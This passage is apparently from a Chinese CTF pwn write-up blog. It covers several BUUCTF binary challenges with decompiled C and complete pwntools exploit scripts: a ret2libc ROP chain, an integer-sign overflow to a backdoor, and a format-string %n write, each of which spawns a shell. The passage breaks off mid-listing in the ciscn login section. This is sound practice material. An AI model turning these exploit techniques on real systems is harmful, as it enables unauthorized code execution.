<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Can u return to libc ?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Try u best!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>vlun</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有后门，ret2libc</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26248</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./bjdctf_2020_babyrop&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line">ret=<span class="number">0x4004c9</span></span><br><span class="line">pop_rdi=<span class="number">0x400733</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln_addr=elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;story!\n&#x27;</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(ret)+p64(pop_rdi)+p64(str_bin_sh)+p64(system)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;story!\n&#x27;</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这次看到了一句关于puts地址接收6位的话。<br>puts的有效地址只有6位，需要再结尾用0补齐8位<br>但是仍是没明白为啥</p>
<h1 id="buuctf-bjdctf-2020-babystack2"><a href="#buuctf-bjdctf-2020-babystack2" class="headerlink" title="buuctf_bjdctf_2020_babystack2"></a>buuctf_bjdctf_2020_babystack2</h1><p>checksec</p>
<img src="/yw/259342972/bjdctf_2020_babystack2_1.png" class>

<p>64位，堆栈不可执行<br>ida<br>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)nbytes &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oops,u name is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后门函数（就在main上面，其实是从字符串窗口找到的）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main函数栈结构</p>
<img src="/yw/259342972/bjdctf_2020_babystack2_2.png" class>

<p>尝试覆盖nbytes，将其数值改大，失败了。<br>后经过观察，输入时的nybtes是有符号数字，而在限制read输入长度时是无符号数字，有符号数和无符号数（没有正负号，都为正)编码不同，具体可以百度搜索或去学习csapp。<br>所以输入-1，在后面read输入时输入长度就是无符号数中的最大值<br>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25691</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./bjdctf_2020_babystack2&#x27;)</span></span><br><span class="line">backdoor=<span class="number">0x400726</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name:\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;name?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(backdoor)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="buuctf-jarvisoj-fm"><a href="#buuctf-jarvisoj-fm" class="headerlink" title="buuctf_jarvisoj_fm"></a>buuctf_jarvisoj_fm</h1><p>checksec</p>
<img src="/yw/259342972/jarvisoj_fm_1.png" class>
<p>32位，堆栈不可执行，有canary保护<br>ida<br>main</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [esp+2Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d!\n&quot;</span>, x);</span><br><span class="line">  <span class="keyword">if</span> ( x == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;running sh...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和ctfshow中的一题很像，考察格式化字符串漏洞利用<br>运行程序，确定输入对于printf的偏移量</p>
<img src="/yw/259342972/jarvisoj_fm_2.png" class>
<p>a的ASCII码时61，所以输入内容相对于printf偏移量为11<br>main函数中x地址为</p>
<img src="/yw/259342972/jarvisoj_fm_3.png" class>

<p>x_addr&#x3D;0x804A02C</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28848</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./fm&#x27;)</span></span><br><span class="line">x_addr=<span class="number">0x804A02C</span></span><br><span class="line">payload=p32(x_addr)+<span class="string">b&#x27;%11$n&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="第五周"><a href="#第五周" class="headerlink" title="第五周"></a>第五周</h1><h1 id="ciscn-login"><a href="#ciscn-login" class="headerlink" title="ciscn login"></a>ciscn login</h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><img src="/yw/259342972/login_1.png" class>

<p>保护全开</p>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>main函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+0h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_C0A(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x3FF</span>uLL);</span><br><span class="line">    sub_FFD(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_FFD函数：检验输入格式，仅符合  opt:v7\n或msg:dest\n  的命令可输入</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_FFD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *sa; <span class="comment">// 指向字符串的指针</span></span><br><span class="line">  <span class="type">char</span> *sb; <span class="comment">// 指向字符串的指针</span></span><br><span class="line">  <span class="type">char</span> *sc; <span class="comment">// 指向字符串的指针</span></span><br><span class="line">  <span class="type">char</span> *sd; <span class="comment">// 指向字符串的指针</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// 单个字符</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// 整数</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// 整数</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// 指向内存块的指针</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// 指向字符串的指针</span></span><br><span class="line">  <span class="type">char</span> *nptr; <span class="comment">// 指向字符串的指针</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// 无符号64位整数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 保存当前线程的堆栈基址</span></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 将一个全局数组qword_202040的内容全部清零</span></span><br><span class="line">  <span class="built_in">memset</span>(qword_202040, <span class="number">0</span>, <span class="keyword">sizeof</span>(qword_202040));</span><br><span class="line"></span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  dest = <span class="number">0LL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 解析输入的字符串a1，直到遇到换行符（&#x27;\n&#x27;）或回车符（&#x27;\r&#x27;）</span></span><br><span class="line">  <span class="keyword">while</span> (!*a1 || *a1 != <span class="number">10</span> &amp;&amp; (*a1 != <span class="number">13</span> || a1[<span class="number">1</span>] != <span class="number">10</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (v8 &lt;= <span class="number">5</span>)</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8] = a1;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在字符串a1中查找字符&#x27;:&#x27;</span></span><br><span class="line">    sb = <span class="built_in">strchr</span>(a1, <span class="number">58</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!sb)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 如果没有找到&#x27;:&#x27;字符，输出错误信息并退出程序</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将&#x27;:&#x27;后面的空白字符置为0</span></span><br><span class="line">    <span class="keyword">for</span> (sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="number">32</span> || *sc == <span class="number">13</span> || *sc == <span class="number">10</span> || *sc == <span class="number">9</span>); ++sc)</span><br><span class="line">      *sc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!*sc)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 如果&#x27;:&#x27;后没有有效字符，输出错误信息并退出程序</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v8 &lt;= <span class="number">5</span>)</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在字符串sc中查找换行符（&#x27;\n&#x27;）</span></span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!sd)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 如果没有找到换行符，输出错误信息并退出程序</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    a1 = sd + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*a1 == <span class="number">13</span>)</span><br><span class="line">      *a1++ = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    s1 = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8];</span><br><span class="line">    nptr = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!strcasecmp(s1, <span class="string">&quot;opt&quot;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (v7)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 如果v7已经被设置，输出错误信息并退出程序</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = atoi(nptr); <span class="comment">// 将字符串转换为整数</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (strcasecmp(s1, <span class="string">&quot;msg&quot;</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 如果s1既不是&quot;opt&quot;也不是&quot;msg&quot;，输出错误信息并退出程序</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 如果nptr长度小于等于1，输出错误信息并退出程序</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (dest)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 如果dest已经被分配了内存，输出错误信息并退出程序</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 分配内存块，大小为v9 + 8字节</span></span><br><span class="line">      dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (v9 &lt;= <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 如果v9小于等于0，输出错误信息并退出程序</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 复制nptr的内容到dest</span></span><br><span class="line">      <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  sa = (<span class="type">char</span> *)(a1 + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (*sa == <span class="number">10</span>)</span><br><span class="line">    *sa = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 根据v7的值调用不同的子函数</span></span><br><span class="line">  <span class="keyword">switch</span> (v7)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      sub_DA8((<span class="type">const</span> <span class="type">char</span> *)dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      sub_EFE(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      sub_CBD((<span class="type">const</span> <span class="type">char</span> *)dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">// 如果v7的值不在预期范围内，输出错误信息并退出程序</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 返回函数结束前的堆栈基址与v13的异或结果</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>v7&#x3D;2时，sub_DA8函数：验证两个变量，将dest内容执行（先映射到内存再执行）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 